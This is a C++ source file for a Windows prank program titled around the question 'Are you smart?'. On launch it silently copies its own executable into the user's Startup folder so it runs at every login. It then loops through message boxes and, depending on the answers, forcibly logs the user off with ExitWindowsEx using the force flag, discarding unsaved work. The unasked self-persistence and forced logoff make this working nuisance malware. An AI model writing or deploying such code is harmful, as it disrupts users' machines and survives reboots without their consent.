#define UNICODE
#include <iostream>
#include <windows.h>
#include <winbase.h>

/**
TODO:
- Update automatically

*/

unsigned amount;
bool downShut;
bool quitNormally;

void CheckForUpdate() {
    
}

void ShutDown() {
    downShut = true;
    ExitWindowsEx(EWX_FORCE | EWX_LOGOFF, SHTDN_REASON_MAJOR_APPLICATION | SHTDN_REASON_MINOR_UNSTABLE);
}

int yes() {
    if (downShut) return false;
    int msgboxID = MessageBox(NULL,
                              (LPCWSTR)L"Are you smart?",
                              (LPCWSTR)L"Question",
                              MB_YESNO);
    
    if (amount == 3 && msgboxID == IDNO) {
        quitNormally = true;
        return false;
    }
    
    if (amount > 10 && msgboxID != IDNO) {
        MessageBox(NULL, (LPCWSTR)L"Say Goodbye", (LPCWSTR)L"", MB_OK);
        ShutDown();
        return true;
    }
    amount++;
    return msgboxID != IDNO;
}

int main(int argc, char** argv)
{
    CheckForUpdate();
    char username[100];
    DWORD username_len = 100;
    GetUserNameA(username, &username_len);
    std::string UserName = username;
    std::string pathOut = "C:\\\\Users\\" + UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\yes.exe";
    remove(pathOut.c_str());
    CopyFileA((LPCSTR)argv[0], pathOut.c_str(), false);
    
    downShut = false;
    amount = 0;
    while (yes());
    
    if (quitNormally) {
        MessageBox(NULL, (LPCWSTR)L"Wow. You know the secret code.", (LPCWSTR)L"", MB_OK);
        MessageBox(NULL, (LPCWSTR)L"I guess you are kinda smart.", (LPCWSTR)L"", MB_OK);
        return 0;
    }
    
    if (!downShut) {
        MessageBox(NULL,
          (LPCWSTR)L"It shows :)",
          (LPCWSTR)L"",
          MB_OK);
        MessageBox(NULL, (LPCWSTR)L"Bye bye", (LPCWSTR)L"", MB_OK);
        ShutDown();
    }
    return 0;
}
